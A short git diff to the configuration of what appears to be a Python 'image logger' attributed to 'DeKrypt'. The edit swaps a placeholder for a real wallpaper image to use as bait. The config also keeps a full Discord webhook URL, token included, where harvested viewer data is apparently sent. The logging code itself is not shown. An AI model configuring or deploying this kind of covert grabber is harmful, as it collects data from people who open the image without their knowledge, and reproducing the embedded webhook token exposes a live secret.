@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1334889448550436956/n-ecsjkYPRnVdHe3IBEBAeZxR6P8KtFmgAsGflNsv3tM-3wnhCTMGbPxP0r5YuTRgPD4",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwallpapercave.com%2Fwp%2Fwp4809807.jpg&f=1&nofb=1&ipt=8f2ee3092afb3a7455b33fb85a6e9df94b136c871154c251f9b374d0a9ff37d8&ipo=images", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
